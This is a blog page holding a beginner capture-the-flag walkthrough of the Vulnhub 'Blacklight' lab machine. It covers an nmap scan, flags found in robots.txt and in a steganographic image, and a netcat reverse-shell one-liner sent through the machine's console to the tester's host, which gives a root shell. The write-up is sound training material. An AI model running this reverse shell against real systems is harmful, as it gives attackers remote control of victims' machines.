@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="DescriptionThis box can also be found on vulnhub.com. There is no proper description, but I can say that the machine is good for newbies, who want to learn.Link: Blacklight on Vulnhub Port scanning">
+<meta name="keywords" content="vulnhub,ctf,walkthrough">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Blacklight Walkthrough">
+<meta property="og:url" content="https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/index.html">
+<meta property="og:site_name" content="InfoSec Adventures">
+<meta property="og:description" content="DescriptionThis box can also be found on vulnhub.com. There is no proper description, but I can say that the machine is good for newbies, who want to learn.Link: Blacklight on Vulnhub Port scanning">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/blacklight_walkthrough.png">
+<meta property="og:image" content="https://cdn-images-1.medium.com/max/2000/1*M_ICC074csyR_m2Rrsyphg.png">
+<meta property="og:updated_time" content="2019-05-01T22:58:08.250Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Blacklight Walkthrough">
+<meta name="twitter:description" content="DescriptionThis box can also be found on vulnhub.com. There is no proper description, but I can say that the machine is good for newbies, who want to learn.Link: Blacklight on Vulnhub Port scanning">
+<meta name="twitter:image" content="https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/blacklight_walkthrough.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+
+    <title>Blacklight Walkthrough</title>
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    
+    
+    
+      <link rel="alternate" href="/atom.xml" title="InfoSec Adventures" type="application/atom+xml">
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/11/16/The-Null-Cipher/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/11/15/Lin-Security-Walkthrough/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/&text=Blacklight Walkthrough"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/&title=Blacklight Walkthrough"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Blacklight Walkthrough&body=Check out this article: https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/&title=Blacklight Walkthrough"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Port scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-first-flag"><span class="toc-number">1.2.</span> <span class="toc-text">The first flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-root-access"><span class="toc-number">1.3.</span> <span class="toc-text">Getting root access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-second-flag"><span class="toc-number">1.4.</span> <span class="toc-text">The second flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">1.5.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Blacklight Walkthrough
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">InfoSec Adventures</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-11-16T09:02:50.000Z" itemprop="datePublished">2018.11.16.</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF-Walkthroughs/">CTF Walkthroughs</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/vulnhub/">vulnhub</a>, <a class="tag-link" href="/tags/walkthrough/">walkthrough</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script>
+
+<p><img src="blacklight_walkthrough.png" alt></p>
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>This box can also be found on vulnhub.com. There is no proper description, but I can say that the machine is good for newbies, who want to learn.<br>Link: <a href="https://www.vulnhub.com/entry/blacklight-1,242/" target="_blank" rel="noopener">Blacklight on Vulnhub</a></p>
+<h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><p>The usual nmap scan returned the following:</p>
+<pre><code>root@kali:~# nmap -A -p- 192.168.43.246
+Nmap scan report for blacklight (192.168.43.246)
+Host is up (0.00020s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: BLACKLIGHT
+9072/tcp open  unknown
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe:
+|_    BLACKLIGHT console mk1. Type .help for instructions
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [https://nmap.org/cgi-bin/submit.cgi?new-service](https://nmap.org/cgi-bin/submit.cgi?new-service) :
+SF-Port9072-TCP:V=7.70%I=7%D=8/15%Time=5B7442E6%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instr
+SF:uctions\n&quot;)%r(GenericLines,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x
+SF:20\.help\x20for\x20instructions\n&quot;)%r(GetRequest,34,&quot;BLACKLIGHT\x20cons
+SF:ole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(HTTPOptions
+SF:,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instruc
+SF:tions\n&quot;)%r(RTSPRequest,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\
+SF:.help\x20for\x20instructions\n&quot;)%r(RPCCheck,34,&quot;BLACKLIGHT\x20console\x
+SF:20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(DNSVersionBindRe
+SF:qTCP,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20ins
+SF:tructions\n&quot;)%r(DNSStatusRequestTCP,34,&quot;BLACKLIGHT\x20console\x20mk1\.\
+SF:x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(Help,34,&quot;BLACKLIGHT\x20c
+SF:onsole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(SSLSessi
+SF:onReq,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20in
+SF:structions\n&quot;)%r(TLSSessionReq,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Ty
+SF:pe\x20\.help\x20for\x20instructions\n&quot;)%r(Kerberos,34,&quot;BLACKLIGHT\x20co
+SF:nsole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(SMBProgNe
+SF:g,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instru
+SF:ctions\n&quot;)%r(X11Probe,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.h
+SF:elp\x20for\x20instructions\n&quot;)%r(FourOhFourRequest,34,&quot;BLACKLIGHT\x20co
+SF:nsole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(LPDString
+SF:,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instruc
+SF:tions\n&quot;)%r(LDAPSearchReq,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x2
+SF:0\.help\x20for\x20instructions\n&quot;)%r(LDAPBindReq,34,&quot;BLACKLIGHT\x20cons
+SF:ole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(SIPOptions,
+SF:34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instruct
+SF:ions\n&quot;)%r(LANDesk-RC,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.h
+SF:elp\x20for\x20instructions\n&quot;)%r(TerminalServer,34,&quot;BLACKLIGHT\x20conso
+SF:le\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(NCP,34,&quot;BLAC
+SF:KLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;);
+MAC Address: 08:00:27:44:1E:0A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.20 ms blacklight (192.168.43.246)
+</code></pre><h2 id="The-first-flag"><a href="#The-first-flag" class="headerlink" title="The first flag"></a>The first flag</h2><p>I started with the web server on port 80. There was nothing particularly interesting on the server except the robots.txt file, which revealed the first flag.</p>
+<blockquote>
+<p>{flag1:fc4c7223964a26b152823d14f129687207e7fe15}</p>
+</blockquote>
+<p>There was also a blacklight.dict file, but at this point, it was not useful. I went back to check out port 9072 with netcat:</p>
+<pre><code>root@kali:~# nc 192.168.43.246 9072
+BLACKLIGHT console mk1. Type .help for instructions
+.help
+.readhash - Get one step closer
+.exec &lt;cmd&gt; - Execute commands
+.quit - Exit the server
+.readhash
+b5f4723bd6df85b54b0905bd6d734be9ef1cc1eb977413a932a828b5c52ef5a6
+You have one more command until the server shuts down. Choose wisely!
+</code></pre><div class="addthis_tipjar_inline"></div>
+
+<h2 id="Getting-root-access"><a href="#Getting-root-access" class="headerlink" title="Getting root access"></a>Getting root access</h2><p>I chose the easy way, but it got me nowhere. I tried to execute a command, but since the output was not displayed, I couldn’t make use of it. Then, I tried executing different reverse shells from pentestmonkey’s website.<br>The second netcat command was the winner:</p>
+<pre><code>.exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.43.5 443 &gt;/tmp/f
+</code></pre><p>Before executing the above command, I obviously set up a listener:</p>
+<pre><code>root@kali:~# nc -lp 443
+/bin/sh: 0: can&apos;t access tty; job control turned off
+# python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;
+root@blacklight:~#
+</code></pre><p>As you can see, I used python to upgrade to a pseudo-terminal and the shell had root privileges, which was awesome. I took the hint from the first flag and started searching in the home folder of the user blacklight.</p>
+<pre><code>root@blacklight:/home/blacklight# ls -la
+total 48
+drwxr-xr-x 6 blacklight blacklight 4096 Jun  7 23:49 .
+drwxr-xr-x 3 root       root       4096 Jun  7 21:01 ..
+-rw------- 1 blacklight blacklight 1019 Jun  8 00:24 .bash_history
+-rw-r--r-- 1 blacklight blacklight  220 Apr  4 18:30 .bash_logout
+-rw-r--r-- 1 blacklight blacklight 3771 Apr  4 18:30 .bashrc
+drwx------ 2 blacklight blacklight 4096 Jun  7 21:01 .cache
+-rwxrwxr-x 1 blacklight blacklight 1019 Jun  7 23:49 console.rb
+drwx------ 3 blacklight blacklight 4096 Jun  7 21:01 .gnupg
+-rw-r--r-- 1 root       root         65 Jun  7 21:56 hash.txt
+drwxrwxr-x 3 blacklight blacklight 4096 Jun  7 22:27 .local
+-rw-r--r-- 1 blacklight blacklight  666 Jun  7 21:27 .profile
+drwxr-xr-x 2 root       root       4096 Jun  7 22:14 .secret
+-rw-r--r-- 1 blacklight blacklight    0 Jun  7 21:01 .sudo_as_admin_successful
+root@blacklight:/home/blacklight# cd .secret
+cd .secret
+root@blacklight:/home/blacklight/.secret# ls -la
+total 28
+drwxr-xr-x 2 root       root        4096 Jun  7 22:14 .
+drwxr-xr-x 6 blacklight blacklight  4096 Jun  7 23:49 ..
+-rw-r--r-- 1 root       root       19080 Jun  7 22:13 flag2-inside.jpg
+</code></pre><h2 id="The-second-flag"><a href="#The-second-flag" class="headerlink" title="The second flag"></a>The second flag</h2><p>I found a picture in a hidden directory,<br>which I moved to the web server directory …</p>
+<pre><code>root@blacklight:/home/blacklight/.secret# cd /var/www/html
+root@blacklight:/var/www/html# ls
+404.html         css        flag2-inside.jpg  footer  index.html  robots.txt
+blacklight.dict  flag1.txt  fonts             img     js
+root@blacklight:/var/www/html#
+</code></pre><p>and downloaded it:</p>
+<pre><code>root@kali:~/Downloads# wget 192.168.43.246/flag2-inside.jpg
+[http://192.168.43.246/flag2-inside.jpg](http://192.168.43.246/flag2-inside.jpg)
+Connecting to 192.168.43.246:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 19080 (19K) [image/jpeg]
+Saving to: ‘flag2-inside.jpg’
+
+flag2-inside.jpg      100%[========================&gt;]  18.63K  --.-KB/s    in 0s
+
+(492 MB/s) - ‘flag2-inside.jpg’ saved [19080/19080]
+</code></pre><p><img src="https://cdn-images-1.medium.com/max/2000/1*M_ICC074csyR_m2Rrsyphg.png" alt="flag2-inside.jpg"></p>
+<p>I forgot to mention that I saw some commands in the .bash_history file related to how this flag was constructed by the creator. Alright, the hint was pretty clear. I installed the outguess program and used the -r switch to retrieve the message and supplied the image and an output file called flag2.txt.</p>
+<pre><code>root@kali:~/Downloads# outguess -r flag2-inside.jpg flag2.txt
+Reading flag2-inside.jpg....
+Extracting usable bits:   18496 bits
+Steg retrieve: seed: 180, len: 133
+</code></pre><p>The final flag was:</p>
+<blockquote>
+<p>{flag2:88ea7554cbc7e89526943e9ad5d3ce2ed5ec3db4}</p>
+</blockquote>
+<h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedbacks and donations are always welcome!</p>
+<p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Port scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-first-flag"><span class="toc-number">1.2.</span> <span class="toc-text">The first flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-root-access"><span class="toc-number">1.3.</span> <span class="toc-text">Getting root access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-second-flag"><span class="toc-number">1.4.</span> <span class="toc-text">The second flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">1.5.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/&text=Blacklight Walkthrough"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/&title=Blacklight Walkthrough"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Blacklight Walkthrough&body=Check out this article: https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2018/11/16/Blacklight-Walkthrough/&title=Blacklight Walkthrough"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <!--<a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>-->
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Kristof Toth
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-131012780-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'infosecadventures';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
